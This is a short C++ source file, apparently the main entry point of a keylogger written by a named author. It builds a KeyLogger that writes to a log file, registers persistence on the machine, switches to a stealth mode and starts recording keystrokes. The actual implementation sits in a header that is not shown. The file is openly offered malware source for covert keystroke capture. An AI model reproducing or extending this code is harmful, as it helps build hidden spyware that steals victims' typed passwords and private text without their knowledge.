//   Author(s) : Narcis GRECU(narcisgrecu07@gmail.com

#include "KeyLogger.h"

int main()
{
	KeyLogger Logger( R"(C:\Users\Narcis\Desktop\log.txt)" );

	if (!Logger.RegisterPersistence())
		return 0;

	if (!Logger.StartStealthMode())
		return 0;

	Logger.StartLogging();

	return 0;
}